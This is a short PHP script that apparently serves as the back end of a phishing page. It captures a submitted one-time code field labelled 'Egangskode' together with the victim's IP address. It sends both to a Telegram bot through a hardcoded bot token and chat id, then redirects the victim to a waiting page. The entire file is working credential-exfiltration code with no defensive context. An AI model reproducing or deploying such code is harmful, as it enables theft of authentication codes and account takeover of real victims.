<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------Egangskode------------------------------\n";
$message .= "Egangskode         : ".$_POST['fs1']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------Egangskode--------------------------------\n";


file_get_contents("https://api.telegram.org/bot6537851274:AAHG6KLwiFGPOruq20MyoI_Fw6Fy_nhMhIM
/sendMessage?chat_id=-953121692 &text=" . urlencode($message)."" );

header("Location: ../wait.php");
?>